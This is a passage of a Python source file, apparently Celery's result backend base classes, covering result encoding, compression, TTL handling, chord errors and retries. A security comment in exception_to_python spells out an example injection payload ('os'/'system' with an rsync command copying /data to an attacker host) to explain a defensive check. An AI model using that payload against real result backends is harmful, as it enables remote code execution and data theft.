"""Result backend base classes.

- :class:`BaseBackend` defines the interface.

- :class:`KeyValueStoreBackend` is a common base class
    using K/V semantics like _get and _put.
"""
import sys
import time
import warnings
from collections import deque, namedtuple
from collections.abc import Mapping
from datetime import timedelta
from functools import partial
from threading import RLock
from uuid import uuid4
from uuid import UUID
from weakref import WeakValueDictionary

from billiard.einfo import ExceptionInfo
from kombu.compression import compress, decompress
from kombu.compression import encoders as compression_encoders
from kombu.compression import get_encoder as get_compression_encoder
from kombu.serialization import dumps, loads, prepare_accept_content
from kombu.serialization import registry as serializer_registry
from kombu.utils.encoding import bytes_to_str, ensure_bytes
from kombu.utils.url import maybe_sanitize_url

import celery.exceptions
from celery import current_app, group, maybe_signature, states
from celery._state import get_current_task
from celery.app.task import Context
from celery.exceptions import (BackendCapabilityError, BackendGetMetaError, BackendStoreError,
                               ChordError, ImproperlyConfigured, NotRegistered, SecurityError,
                               TaskRevokedError, TimeoutError)
from celery.result import GroupResult, ResultBase, ResultSet, allow_join_result, result_from_tuple
from celery.utils.collections import BufferMap
from celery.utils.functional import LRUCache, arity_greater
from celery.utils.log import get_logger
from celery.utils.serialization import (create_exception_cls, ensure_serializable, get_pickleable_exception,
                                        get_pickled_exception, raise_with_context)
from celery.utils.time import get_exponential_backoff_interval

__all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')

RESULT_KIND_TASK = 'result'
RESULT_KIND_GROUP = 'group'
RESULT_KIND_CHORD = 'chord'
RESULT_KIND_PENDING = 'pending'

PENDING_REF_SUFFIX = '.pending-body'
CHORD_COUNTER_SUFFIXES = frozenset({'.j', '.l', '.t', '.s'})

CLEANUP_REASON_TTL = 'ttl_expired'
CLEANUP_REASON_ORPHAN = 'orphaned_pending_reference'

RESULT_KIND_KEYS = (
    RESULT_KIND_TASK,
    RESULT_KIND_GROUP,
    RESULT_KIND_CHORD,
    RESULT_KIND_PENDING,
)

EXCEPTION_ABLE_CODECS = frozenset({'pickle'})

#: Marker prepended to compressed result payloads.
#:
#: Unlike a task message, a stored result has nowhere to keep the
#: ``compression`` header that Kombu uses to tell a consumer how a body was
#: compressed, because backends store the payload as a single opaque value.
#: The compression type therefore travels in-band, in front of the compressed
#: body: ``MAGIC + content-type + b'\0' + body``.
#:
#: The leading NUL byte cannot start the output of any serializer Celery
#: ships with (JSON and YAML are text, pickle starts with an opcode, and
#: msgpack encodes a mapping with a byte in the ``0x80``-``0xdf`` range), so a
#: payload written before compression was turned on is never mistaken for a
#: compressed one.
COMPRESSED_PAYLOAD_MAGIC = b'\x00celery-compressed\x00'

logger = get_logger(__name__)

MESSAGE_BUFFER_MAX = 8192

pending_results_t = namedtuple('pending_results_t', (
    'concrete', 'weak',
))
cleanup_event_t = namedtuple('cleanup_event_t', (
    'kind', 'key', 'reason', 'ttl', 'age', 'status', 'cursor',
))

E_NO_BACKEND = """
No result backend is configured.
Please see the documentation for more information.
"""

E_CHORD_NO_BACKEND = """
Starting chords requires a result backend to be configured.

Note that a group chained with a task is also upgraded to be a chord,
as this pattern requires synchronization.

Result backends that supports chords: Redis, Database, Memcached, and more.
"""

E_UNKNOWN_COMPRESSION = """\
Unknown compression method {0!r} configured in result_compression.
Available methods are: {1}.
"""

W_COMPRESSION_UNSUPPORTED = """\
The {0} result backend cannot store compressed payloads, so the
result_compression setting is ignored and results are stored uncompressed.
"""


def compress_payload(payload, compression):
    """Compress an encoded result payload.

    The returned payload describes its own compression method, so
    :func:`decompress_payload` can undo this without being told which
    method was used.

    Arguments:
        payload (AnyStr): An encoded result payload.
        compression (str): Name of a method in the Kombu compression
            registry, for example ``'gzip'``.
    """
    body, content_type = compress(payload, compression)
    return b''.join([
        COMPRESSED_PAYLOAD_MAGIC, content_type.encode('utf-8'), b'\x00', body,
    ])


def decompress_payload(payload):
    """Decompress a payload written by :func:`compress_payload`.

    Payloads that don't carry the marker are returned as they are, so
    results stored before compression was enabled are still readable, and
    payloads that do carry it are decompressed even when the reader has no
    compression of its own configured.
    """
    if isinstance(payload, memoryview):
        payload = payload.tobytes()
    if not isinstance(payload, (bytes, bytearray)):
        return payload
    if not payload.startswith(COMPRESSED_PAYLOAD_MAGIC):
        return payload
    content_type, _, body = payload[
        len(COMPRESSED_PAYLOAD_MAGIC):].partition(b'\x00')
    return decompress(body, content_type.decode('utf-8'))


def unpickle_backend(cls, args, kwargs):
    """Return an unpickled backend."""
    return cls(*args, app=current_app._get_current_object(), **kwargs)


def _create_chord_error_with_cause(message, original_exc=None) -> ChordError:
    """Create a ChordError preserving the original exception as __cause__.

    This helper reduces code duplication across the codebase when creating
    ChordError instances that need to preserve the original exception.
    """
    chord_error = ChordError(message)
    if isinstance(original_exc, Exception):
        chord_error.__cause__ = original_exc
    return chord_error


def _create_fake_task_request(task_id, errbacks=None, task_name='unknown', **extra) -> Context:
    """Create a fake task request context for error callbacks.

    This helper reduces code duplication when creating fake request contexts
    for error callback handling.
    """
    return Context({
        "id": task_id,
        "errbacks": errbacks or [],
        "delivery_info": dict(),
        "task": task_name,
        **extra
    })


class _nulldict(dict):
    def ignore(self, *a, **kw):
        pass

    __setitem__ = update = setdefault = ignore


def _is_request_ignore_result(request):
    if request is None:
        return False
    return request.ignore_result


def _coerce_ttl(value):
    if value is None:
        return None
    if isinstance(value, timedelta):
        value = value.total_seconds()
    value = float(value)
    if value < 0:
        raise ValueError('result TTL must not be negative')
    return None if value == 0 else value


class CleanupReport:
    """Serializable report returned by an idempotent backend cleanup."""

    def __init__(self, deleted=None, retained=None, events=None,
                 cursor=None, next_cursor=None, degraded=None, errors=None):
        self.deleted = dict(deleted or {})
        self.retained = dict(retained or {})
        self.events = list(events or [])
        self.cursor = cursor
        self.next_cursor = next_cursor
        self.degraded = list(degraded or [])
        self.errors = list(errors or [])

    def __bool__(self):
        return True

    def as_dict(self):
        return {
            'deleted': self.deleted,
            'retained': self.retained,
            'events': [event._asdict() for event in self.events],
            'cursor': self.cursor,
            'next_cursor': self.next_cursor,
            'degraded': self.degraded,
            'errors': self.errors,
        }


class Backend:
    READY_STATES = states.READY_STATES
    UNREADY_STATES = states.UNREADY_STATES
    EXCEPTION_STATES = states.EXCEPTION_STATES

    TimeoutError = TimeoutError

    #: Time to sleep between polling each individual item
    #: in `ResultSet.iterate`. as opposed to the `interval`
    #: argument which is for each pass.
    subpolling_interval = None

    #: If true the backend must implement :meth:`get_many`.
    supports_native_join = False

    #: If true the backend must automatically expire results.
    #: The daily backend_cleanup periodic task won't be triggered
    #: in this case.
    supports_autoexpire = False

    #: Set to true if the backend is persistent by default.
    persistent = True

    #: If true the backend can store a result payload that has been
    #: compressed, which means storing and returning arbitrary bytes
    #: unchanged.  Backends that put the payload inside a JSON document, or
    #: that decode it to text on the way out, can't, and the
    #: :setting:`result_compression` setting is ignored for them.
    supports_result_compression = False

    supports_result_ttl = False
    supports_atomic_result_updates = False
    supports_result_cleanup_scan = False
    supports_manual_cleanup = False
    supports_conditional_delete = False
    cleanup_batch_size = 500

    retry_policy = {
        'max_retries': 20,
        'interval_start': 0,
        'interval_step': 1,
        'interval_max': 1,
    }

    def __init__(self, app,
                 serializer=None, max_cached_results=None, accept=None,
                 expires=None, expires_type=None, url=None, **kwargs):
        self.app = app
        conf = self.app.conf
        self.serializer = serializer or conf.result_serializer
        (self.content_type,
         self.content_encoding,
         self.encoder) = serializer_registry._encoders[self.serializer]
        self.compression = self.prepare_compression(
            conf.get('result_compression'))
        cmax = max_cached_results or conf.result_cache_max
        self._cache = _nulldict() if cmax == -1 else LRUCache(limit=cmax)

        self.expires = self.prepare_expires(expires, expires_type)
        self.result_ttls = self.prepare_result_ttls(conf.get('result_ttls'))
        self.cleanup_batch_size = conf.get(
            'result_backend_cleanup_batch_size', self.cleanup_batch_size)

        # precedence: accept, conf.result_accept_content, conf.accept_content
        self.accept = conf.result_accept_content if accept is None else accept
        self.accept = conf.accept_content if self.accept is None else self.accept
        self.accept = prepare_accept_content(self.accept)

        self.always_retry = conf.get('result_backend_always_retry', False)
        self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)
        self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)
        self.max_retries = conf.get('result_backend_max_retries', float("inf"))
        self.thread_safe = conf.get('result_backend_thread_safe', False)

        self._pending_results = pending_results_t({}, WeakValueDictionary())
        self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)
        self.url = url
        self._state_lock = RLock()
        self._check_result_backend_capabilities()

    def as_uri(self, include_password=False):
        """Return the backend as an URI, sanitizing the password or not."""
        # when using maybe_sanitize_url(), "/" is added
        # we're stripping it for consistency
        if include_password:
            return self.url
        url = maybe_sanitize_url(self.url or '')
        return url[:-1] if url.endswith(':///') else url

    def mark_as_started(self, task_id, **meta):
        """Mark a task as started."""
        return self.store_result(task_id, meta, states.STARTED)

    def mark_as_done(self, task_id, result,
                     request=None, store_result=True, state=states.SUCCESS):
        """Mark task as successfully executed."""
        if self._should_store_result(store_result, request):
            self.store_result(task_id, result, state, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, result)

    def mark_as_failure(self, task_id, exc,
                        traceback=None, request=None,
                        store_result=True, call_errbacks=True,
                        state=states.FAILURE):
        """Mark task as executed with failure."""
        if self._should_store_result(store_result, request):
            self.store_result(task_id, exc, state,
                              traceback=traceback, request=request)
        if request:
            # This task may be part of a chord
            if request.chord:
                self.on_chord_part_return(request, state, exc)
            # It might also have chained tasks which need to be propagated to,
            # this is most likely to be exclusive with being a direct part of a
            # chord but we'll handle both cases separately.
            #
            # The `chain_data` try block here is a bit tortured since we might
            # have non-iterable objects here in tests and it's easier this way.
            try:
                chain_data = iter(request.chain)
            except (AttributeError, TypeError):
                chain_data = tuple()
            chain_elems = deque(chain_data)
            while chain_elems:
                chain_elem = chain_elems.popleft()
                # Reconstruct a `Context` object for the chained task which has
                # enough information to for backends to work with
                chain_elem_ctx = Context(chain_elem)
                chain_elem_ctx.update(chain_elem_ctx.options)
                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')
                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')
                # If the state should be propagated, we'll do so for all
                # elements of the chain. This is only truly important so
                # that the last chain element which controls completion of
                # the chain itself is marked as completed to avoid stalls.
                #
                # Some chained elements may be complex signatures and have no
                # task ID of their own, so we skip them hoping that not
                # descending through them is OK. If the last chain element is
                # complex, we assume it must have been uplifted to a chord by
                # the canvas code and therefore the condition below will ensure
                # that we mark something as being complete as avoid stalling.
                if (
                    store_result and state in states.PROPAGATE_STATES and
                    chain_elem_ctx.id is not None
                ):
                    self.store_result(
                        chain_elem_ctx.id, exc, state,
                        traceback=traceback, request=chain_elem_ctx,
                    )
                # If the chain element is a member of a chord, we also need
                # to call `on_chord_part_return()` as well to avoid stalls.
                if 'chord' in chain_elem_ctx.options:
                    self.on_chord_part_return(chain_elem_ctx, state, exc)
                # A chord step completes only when its body does, so the
                # result that later steps and any enclosing chord wait on is
                # the chord body, not the chord's own id. Descend into it so
                # the failure reaches that result (see issue #9674).
                if getattr(chain_elem_ctx, 'subtask_type', None) == 'chord':
                    chord_body = (chain_elem_ctx.kwargs or {}).get('body')
                    if chord_body is not None:
                        chain_elems.append(chord_body)
            # And finally we'll fire any errbacks
            if call_errbacks and request.errbacks:
                self._call_task_errbacks(request, exc, traceback)

    def _call_task_errbacks(self, request, exc, traceback):
        old_signature = []
        for errback in request.errbacks:
            errback = self.app.signature(errback)
            if not errback._app:
                # Ensure all signatures have an application
                errback._app = self.app
            try:
                if (
                        # Celery tasks type created with the @task decorator have
                        # the __header__ property, but Celery task created from
                        # Task class do not have this property.
                        # That's why we have to check if this property exists
                        # before checking is it partial function.
                        hasattr(errback.type, '__header__') and

                        # workaround to support tasks with bind=True executed as
                        # link errors. Otherwise, retries can't be used
                        not isinstance(errback.type.__header__, partial) and
                        arity_greater(errback.type.__header__, 1)
                ):
                    try:
                        errback(request, exc, traceback)
                    except Exception:
                        logger.exception(
                            'Errback %r raised an exception',
                            errback.name,
                        )
                else:
                    old_signature.append(errback)
            except NotRegistered:
                # Task may not be present in this worker.
                # We simply send it forward for another worker to consume.
                # If the task is not registered there, the worker will raise
                # NotRegistered.
                old_signature.append(errback)

        if old_signature:
            # Previously errback was called as a task so we still
            # need to do so if the errback only takes a single task_id arg.
            task_id = request.id
            root_id = request.root_id or task_id
            g = group(old_signature, app=self.app)
            if self.app.conf.task_always_eager or request.delivery_info.get('is_eager', False):
                g.apply(
                    (task_id,), parent_id=task_id, root_id=root_id
                )
            else:
                g.apply_async(
                    (task_id,), parent_id=task_id, root_id=root_id
                )

    def mark_as_revoked(self, task_id, reason='',
                        request=None, store_result=True, state=states.REVOKED):
        exc = TaskRevokedError(reason)
        if self._should_store_result(store_result, request):
            self.store_result(task_id, exc, state,
                              traceback=None, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, exc)

    def mark_as_retry(self, task_id, exc, traceback=None,
                      request=None, store_result=True, state=states.RETRY):
        """Mark task as being retries.

        Note:
            Stores the current exception (if any).
        """
        if self._should_store_result(store_result, request):
            return self.store_result(task_id, exc, state,
                                     traceback=traceback, request=request)

    def chord_error_from_stack(self, callback, exc=None):
        app = self.app

        try:
            backend = app._tasks[callback.task].backend
        except KeyError:
            backend = self

        # Handle group callbacks specially to prevent hanging body tasks
        if isinstance(callback, group):
            return self._handle_group_chord_error(group_callback=callback, backend=backend, exc=exc)

        # Generate an ID if missing so the error can be stored.
        callback_id = callback.id
        if not callback_id:
            from kombu.utils.uuid import uuid
            callback_id = callback.options['task_id'] = uuid()

        # We have to make a fake request since either the callback failed or
        # we're pretending it did since we don't have information about the
        # chord part(s) which failed. This request is constructed as a best
        # effort for new style errbacks and may be slightly misleading about
        # what really went wrong, but at least we call them!
        fake_request = _create_fake_task_request(
            task_id=callback.options.get("task_id"),
            errbacks=callback.options.get("link_error", []),
            **callback
        )
        try:
            self._call_task_errbacks(fake_request, exc, None)
        except Exception as eb_exc:  # pylint: disable=broad-except
            return backend.fail_from_current_stack(callback_id, exc=eb_exc)
        else:
            return backend.fail_from_current_stack(callback_id, exc=exc)

    def _handle_group_chord_error(self, group_callback, backend, exc=None):
        """Handle chord errors when the callback is a group.

        When a chord header fails and the body is a group, we need to:
        1. Revoke all pending tasks in the group body
        2. Mark them as failed with the chord error
        3. Call error callbacks for each task

        This prevents the group body tasks from hanging indefinitely (#8786)
        """

        # Extract original exception from ChordError if available
        if isinstance(exc, ChordError) and hasattr(exc, '__cause__') and exc.__cause__:
            original_exc = exc.__cause__
        else:
            original_exc = exc

        try:
            # Freeze the group to get the actual GroupResult with task IDs
            frozen_group = group_callback.freeze()

            if isinstance(frozen_group, GroupResult):
                # revoke all tasks in the group to prevent execution
                frozen_group.revoke()

                # Handle each task in the group individually
                for result in frozen_group.results:
                    try:
                        # Create fake request for error callbacks
                        fake_request = _create_fake_task_request(
                            task_id=result.id,
                            errbacks=group_callback.options.get("link_error", []),
                            task_name=getattr(result, 'task', 'unknown')
                        )

                        # Call error callbacks for this task with original exception
                        try:
                            backend._call_task_errbacks(fake_request, original_exc, None)
                        except Exception:  # pylint: disable=broad-except
                            # continue on exception to be sure to iter to all the group tasks
                            pass

                        # Mark the individual task as failed with original exception
                        backend.fail_from_current_stack(result.id, exc=original_exc)

                    except Exception as task_exc:  # pylint: disable=broad-except
                        # Log error but continue with other tasks
                        logger.exception(
                            'Failed to handle chord error for task %s: %r',
                            getattr(result, 'id', 'unknown'), task_exc
                        )

                # Also mark the group itself as failed if it has an ID
                frozen_group_id = getattr(frozen_group, 'id', None)
                if frozen_group_id:
                    backend.mark_as_failure(frozen_group_id, original_exc)

            return None

        except Exception as cleanup_exc:  # pylint: disable=broad-except
            # Log the error and fall back to single task handling
            logger.exception(
                'Failed to handle group chord error, falling back to single task handling: %r',
                cleanup_exc
            )
            # Fallback to original error handling
            return backend.fail_from_current_stack(group_callback.id, exc=exc)

    def fail_from_current_stack(self, task_id, exc=None):
        type_, real_exc, tb = sys.exc_info()
        try:
            exc = real_exc if exc is None else exc
            exception_info = ExceptionInfo((type_, exc, tb))
            self.mark_as_failure(task_id, exc, exception_info.traceback)
            return exception_info
        finally:
            while tb is not None:
                try:
                    tb.tb_frame.clear()
                    tb.tb_frame.f_locals
                except RuntimeError:
                    # Ignore the exception raised if the frame is still executing.
                    pass
                tb = tb.tb_next

            del tb

    def prepare_exception(self, exc, serializer=None):
        """Prepare exception for serialization."""
        serializer = self.serializer if serializer is None else serializer
        if serializer in EXCEPTION_ABLE_CODECS:
            return get_pickleable_exception(exc)
        exctype = type(exc)
        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),
                'exc_message': ensure_serializable(exc.args, self.encode),
                'exc_module': exctype.__module__}

    def exception_to_python(self, exc):
        """Convert serialized exception to Python exception."""
        if not exc:
            return None
        elif isinstance(exc, BaseException):
            if self.serializer in EXCEPTION_ABLE_CODECS:
                exc = get_pickled_exception(exc)
            return exc
        elif not isinstance(exc, dict):
            try:
                exc = dict(exc)
            except TypeError as e:
                raise TypeError(f"If the stored exception isn't an "
                                f"instance of "
                                f"BaseException, it must be a dictionary.\n"
                                f"Instead got: {exc}") from e

        exc_module = exc.get('exc_module')
        try:
            exc_type = exc['exc_type']
        except KeyError as e:
            raise ValueError("Exception information must include "
                             "the exception type") from e
        if exc_module is None:
            cls = create_exception_cls(
                exc_type, __name__)
        else:
            try:
                # Load module and find exception class in that
                cls = sys.modules[exc_module]
                # The type can contain qualified name with parent classes
                for name in exc_type.split('.'):
                    cls = getattr(cls, name)
            except (KeyError, AttributeError):
                cls = create_exception_cls(exc_type,
                                           celery.exceptions.__name__)
        exc_msg = exc.get('exc_message', '')

        # If the recreated exception type isn't indeed an exception,
        # this is a security issue. Without the condition below, an attacker
        # could exploit a stored command vulnerability to execute arbitrary
        # python code such as:
        # os.system("rsync /data attacker@192.168.56.100:~/data")
        # The attacker sets the task's result to a failure in the result
        # backend with the os as the module, the system function as the
        # exception type and the payload
        # rsync /data attacker@192.168.56.100:~/data
        # as the exception arguments like so:
        # {
        #   "exc_module": "os",
        #   "exc_type": "system",
        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        # }
        if not isinstance(cls, type) or not issubclass(cls, BaseException):
            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
            raise SecurityError(
                f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")

        # XXX: Without verifying `cls` is actually an exception class,
        #      an attacker could execute arbitrary python code.
        #      cls could be anything, even eval().
        try:
            if isinstance(exc_msg, (tuple, list)):
                exc = cls(*exc_msg)
            else:
                exc = cls(exc_msg)
        except Exception as err:  # noqa
            exc = Exception(f'{cls}({exc_msg})')

        return exc

    def prepare_value(self, result):
        """Prepare value for storage."""
        if self.serializer != 'pickle' and isinstance(result, ResultBase):
            return result.as_tuple()
        return result

    def encode(self, data):
        _, _, payload = self._encode(data)
        if self.compression:
            payload = compress_payload(payload, self.compression)
        return payload

    def _encode(self, data):
        return dumps(data, serializer=self.serializer)

    def meta_from_decoded(self, meta):
        if meta['status'] in self.EXCEPTION_STATES:
            meta['result'] = self.exception_to_python(meta['result'])
        return meta

    def decode_result(self, payload):
        return self.meta_from_decoded(self.decode(payload))

    def decode(self, payload):
        if payload is None:
            return payload
        payload = payload or str(payload)
        # Driven by the payload itself rather than by ``self.compression`` so
        # that a result stays readable after the setting is turned off again,
        # and so that a reader that never had it turned on can still read a
        # result written by a worker that did.
        payload = decompress_payload(payload)
        return loads(payload,
                     content_type=self.content_type,
                     content_encoding=self.content_encoding,
                     accept=self.accept)

    def prepare_compression(self, compression):
        """Return the compression method to encode results with.

        Returns :const:`None` when results should be stored uncompressed,
        either because nothing was configured or because this backend can't
        hold a compressed payload.
        """
        if not compression:
            return None
        if not self.supports_result_compression:
            warnings.warn(
                W_COMPRESSION_UNSUPPORTED.format(type(self).__name__),
                UserWarning,
            )
            return None
        try:
            get_compression_encoder(compression)
        except KeyError as e:
            raise ImproperlyConfigured(E_UNKNOWN_COMPRESSION.format(
                compression,
                ', '.join(sorted(compression_encoders())))) from e
        return compression

    def prepare_expires(self, value, type=None):
        if value is None:
            value = self.app.conf.result_expires
        if isinstance(value, timedelta):
            value = value.total_seconds()
        if value is not None and type:
            return type(value)
        return value

    def prepare_result_ttls(self, configured=None):
        default = _coerce_ttl(self.expires)
        longer_default = (
            None if default is None
            else max(default, 7 * 24 * 60 * 60.0)
        )
        ttls = {
            states.PENDING: None,
            states.STARTED: None,
            states.RETRY: None,
            states.SUCCESS: default,
            states.FAILURE: default,
            states.REVOKED: default,
            'children': default,
            'group': longer_default,
            'chord': longer_default,
            'pending_body': longer_default,
        }
        configured = configured or {}
        if not isinstance(configured, dict):
            raise ImproperlyConfigured('result_ttls must be a dictionary')
        for key, value in configured.items():
            if key not in ttls:
                raise ImproperlyConfigured(f'Unknown result TTL key: {key!r}')
            ttls[key] = _coerce_ttl(value)
        return ttls

    def result_ttl_for(self, state_or_kind):
        return self.result_ttls.get(state_or_kind, self.expires)

    def _should_store_result(self, store_result, request=None):
        return store_result and not _is_request_ignore_result(request)

    def _new_result_version(self):
        return uuid4().hex

    def _current_time(self):
        return self.app.now()

    def _isoformat(self, value):
        return value.isoformat()

    def _parse_datetime(self, value):
        if isinstance(value, str):
            try:
                from dateutil.parser import parse as parse_date

                return parse_date(value)
            except (ImportError, ValueError, OverflowError):
                return None
        return value

    def _meta_updated_at(self, meta):
        value = meta.get('updated_at') or meta.get('date_done')
        parsed = self._parse_datetime(value)
        return parsed if hasattr(parsed, 'timestamp') else None

    def _meta_ttl(self, meta, kind=RESULT_KIND_TASK):
        if kind == RESULT_KIND_GROUP:
            return meta.get('ttl', self.result_ttl_for('group'))
        if kind == RESULT_KIND_CHORD:
            return meta.get('ttl', self.result_ttl_for('chord'))
        if kind == RESULT_KIND_PENDING:
            return meta.get('ttl', self.result_ttl_for('pending_body'))
        state = meta.get('status')
        return meta.get('ttl', self.result_ttl_for(state))

    def _is_meta_expired(self, meta, kind=RESULT_KIND_TASK, now=None):
        updated_at = self._meta_updated_at(meta)
        ttl = self._meta_ttl(meta, kind)
        if updated_at is None or ttl is None:
            return False, None, None
        now = now or self._current_time()
        age = (now - updated_at).total_seconds()
        return age >= ttl, ttl, age

    def _state_can_replace(self, current_state, new_state):
        if current_state in (None, states.PENDING):
            return True
        if current_state == states.SUCCESS:
            return False
        if new_state in (states.PENDING, states.RECEIVED):
            return False
        if current_state in self.READY_STATES:
            return new_state in self.READY_STATES and \
                states.precedence(new_state) <= states.precedence(current_state)
        if new_state == states.RETRY:
            return current_state in (states.STARTED, states.RECEIVED, states.RETRY)
        if new_state == states.STARTED:
            return current_state in (states.RECEIVED, states.STARTED)
        return states.precedence(new_state) <= states.precedence(current_state)

    def _check_result_backend_capabilities(self):
        conf = self.app.conf
        configured_ttls = conf.get('result_ttls')
        if configured_ttls is not None and not self.supports_result_ttl:
            raise BackendCapabilityError(
                f'{type(self).__name__} does not support state-specific TTL')
        if conf.get('result_backend_cleanup_strict') and \
                not self.supports_result_cleanup_scan and \
                not self.supports_autoexpire:
            raise BackendCapabilityError(
                f'{type(self).__name__} does not support result cleanup scans')

    def require_atomic_result_updates(self):
        if self.app.conf.get('result_backend_require_atomic_updates') and \
                not self.supports_atomic_result_updates:
            raise BackendCapabilityError(
                f'{type(self).__name__} does not support atomic result updates')

    def prepare_persistent(self, enabled=None):
        if enabled is not None:
            return enabled
        persistent = self.app.conf.result_persistent
        return self.persistent if persistent is None else persistent

    def encode_result(self, result, state):
        if state in self.EXCEPTION_STATES and isinstance(result, BaseException):
            return self.prepare_exception(result)
        return self.prepare_value(result)

    def is_cached(self, task_id):
        return task_id in self._cache

    def _get_result_meta(self, result,
                         state, traceback, request, format_date=True,
                         encode=False, version=None, updated_at=None, ttl=None):
        updated_at = updated_at or self.app.now()
        if state in self.READY_STATES:
            date_done = updated_at
            if format_date:
                date_done = date_done.isoformat()
        else:
            date_done = None

        meta = {
            'status': state,
            'result': result,
            'traceback': traceback,
            'children': self.current_task_children(request),
            'date_done': date_done,
            'version': version,
            'updated_at': self._isoformat(updated_at) if format_date else updated_at,
            'ttl': ttl,
        }

        if request and getattr(request, 'group', None):
            meta['group_id'] = request.group
        if request and getattr(request, 'parent_id', None):
            meta['parent_id'] = request.parent_id

        if self.app.conf.find_value_for_key('extended', 'result'):
            if request:
                request_meta = {
                    'name': getattr(request, 'task', None),
                    'args': getattr(request, 'args', None),
                    'kwargs': getattr(request, 'kwargs', None),
                    'worker': getattr(request, 'hostname', None),
                    'retries': getattr(request, 'retries', None),
                    'queue': request.delivery_info.get('routing_key')
                    if hasattr(request, 'delivery_info') and
                    request.delivery_info else None,
                }
                if getattr(request, 'stamps', None):
                    request_meta['stamped_headers'] = request.stamped_headers
                    request_meta.update(request.stamps)

                if encode:
                    # args and kwargs need to be encoded properly before saving
                    encode_needed_fields = {"args", "kwargs"}
                    for field in encode_needed_fields:
                        value = request_meta[field]
                        encoded_value = self.encode(value)
                        request_meta[field] = ensure_bytes(encoded_value)

                meta.update(request_meta)

        return meta

    def _sleep(self, amount):
        time.sleep(amount)

    def _ensure_retryable(self, func, *args, fallback_exc=None, fallback_msg=None, **kwargs):
        """Helper to execute a function with the backend's retry policy."""
        retries = 0
        while True:
            try:
                return func(*args, **kwargs)
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1
                        logger.warning(
                            'Failed operation %s. Retrying %s more times.',
                            getattr(func, '__name__', repr(func)), self.max_retries - retries,
                            exc_info=True)
                        try:
                            self.on_backend_retryable_error(exc)
                        except Exception:
                            logger.exception(
                                "on_backend_retryable_error hook failed; continuing retry loop",
                            )

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        if fallback_exc:
                            exc_kwargs = {}
                            for key in ("task_id", "state"):
                                if key in kwargs:
                                    exc_kwargs[key] = kwargs[key]
                            raise_with_context(fallback_exc(fallback_msg, **exc_kwargs))
                        raise
                else:
                    raise

    def store_result(self, task_id, result, state,
                     traceback=None, request=None, **kwargs):
        """Update task state and result.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        result = self.encode_result(result, state)

        kwargs.update({'task_id': task_id, 'state': state})

        self._ensure_retryable(
            self._store_result,
            fallback_exc=BackendStoreError,
            fallback_msg="failed to store result on the backend",
            result=result,
            traceback=traceback,
            request=request,
            **kwargs
        )
        return result

    def forget(self, task_id):
        self._cache.pop(task_id, None)
        self._ensure_retryable(self._forget, task_id=task_id)

    def _forget(self, task_id):
        raise NotImplementedError('backend does not implement forget.')

    def get_state(self, task_id):
        """Get the state of a task."""
        return self.get_task_meta(task_id)['status']

    get_status = get_state  # XXX compat

    def get_traceback(self, task_id):
        """Get the traceback for a failed task."""
        return self.get_task_meta(task_id).get('traceback')

    def get_result(self, task_id):
        """Get the result of a task."""
        return self.get_task_meta(task_id).get('result')

    def get_children(self, task_id):
        """Get the list of subtasks sent by a task."""
        try:
            return self.get_task_meta(task_id)['children']
        except KeyError:
            pass

    def _ensure_not_eager(self):
        if self.app.conf.task_always_eager and not self.app.conf.task_store_eager_result:
            warnings.warn(
                "Results are not stored in backend and should not be retrieved when "
                "task_always_eager is enabled, unless task_store_eager_result is enabled.",
                RuntimeWarning,
                stacklevel=2,
            )

    def exception_safe_to_retry(self, exc):
        """Check if an exception is safe to retry.

        Backends have to overload this method with correct predicates dealing with their exceptions.

        By default no exception is safe to retry, it's up to backend implementation
        to define which exceptions are safe.
        """
        return False

    def on_backend_retryable_error(self, exc):
        """Hook called before retrying a recoverable backend exception."""
        return None

    def get_task_meta(self, task_id, cache=True):
        """Get task meta from backend.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[task_id]
            except KeyError:
                pass

        meta = self._ensure_retryable(
            self._get_task_meta_for,
            fallback_exc=BackendGetMetaError,
            fallback_msg="failed to get meta",
            task_id=task_id
        )

        if cache and meta.get('status') == states.SUCCESS:
            self._cache[task_id] = meta
        return meta

    def reload_task_result(self, task_id):
        """Reload task result, even if it has been previously fetched."""
        self._cache[task_id] = self.get_task_meta(task_id, cache=False)

    def task_result_exists(self, task_id):
        """Check if a result exists in the backend for the given task ID.

        .. versionadded:: 5.7.0

        Returns:
            bool: :const:`True` if the backend has a result for the task,
                :const:`False` otherwise.
        """
        return self._get_task_meta_for(task_id)["status"] != states.PENDING

    def reload_group_result(self, group_id):
        """Reload group result, even if it has been previously fetched."""
        self._cache[group_id] = self.get_group_meta(group_id, cache=False)

    def get_group_meta(self, group_id, cache=True):
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[group_id]
            except KeyError:
                pass

        meta = self._ensure_retryable(self._restore_group, group_id=group_id)
        if cache and meta is not None:
            self._cache[group_id] = meta
        return meta

    def restore_group(self, group_id, cache=True):
        """Get the result for a group."""
        meta = self.get_group_meta(group_id, cache=cache)
        if meta:
            return meta['result']

    def save_group(self, group_id, result):
        """Store the result of an executed group."""
        return self._ensure_retryable(
            self._save_group,
            group_id=group_id,
            result=result
        )

    def delete_group(self, group_id):
        self._cache.pop(group_id, None)
        return self._ensure_retryable(self._delete_group, group_id=group_id)

    def cleanup(self, cursor=None, batch_size=None):
        """Delete expired backend data.

        Backends that cannot enumerate their stored keys must either override
